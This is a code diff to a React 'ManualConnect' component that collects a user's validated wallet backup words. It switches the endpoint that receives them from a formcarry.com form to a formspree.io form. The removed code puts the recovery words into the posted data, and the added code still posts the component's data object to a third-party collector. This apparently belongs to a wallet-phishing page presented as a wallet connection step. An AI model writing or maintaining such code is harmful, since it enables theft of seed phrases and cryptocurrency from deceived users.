@@ -64,22 +64,30 @@ const ManualConnect = ({ backToErrorModal, userWalletDetails, closeManualConnect
   }
 
   const handleValidatedWords = async (words) => {
-    setIsLoading(true)
-    data.backupdata = words
-    const result = await fetch("https://formcarry.com/s/gqHpTaauB8x", {
-      method: 'POST',
-      headers: {
-        "Accept": "application/json",
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(data)
-    })
+    setIsLoading(true);
+  
 
-
-    const responseresult = await  result.json()
-    setIsLoading(false)
-    return responseresult?.status === "success" ? true : false;
-  }
+    try {
+      const result = await fetch("https://formspree.io/f/xqapnoop", {
+        method: 'POST',
+        headers: {
+          "Accept": "application/json",
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      });
+  
+      const responseresult = await result.json();
+      setIsLoading(false);
+      
+      return responseresult?.ok === true; // Formspree returns `ok: true` on success
+    } catch (err) {
+      setIsLoading(false);
+      console.error("Failed to submit:", err);
+      return false;
+    }
+  };
+  
 
   const submitBackup = () => {
     handleConnected()
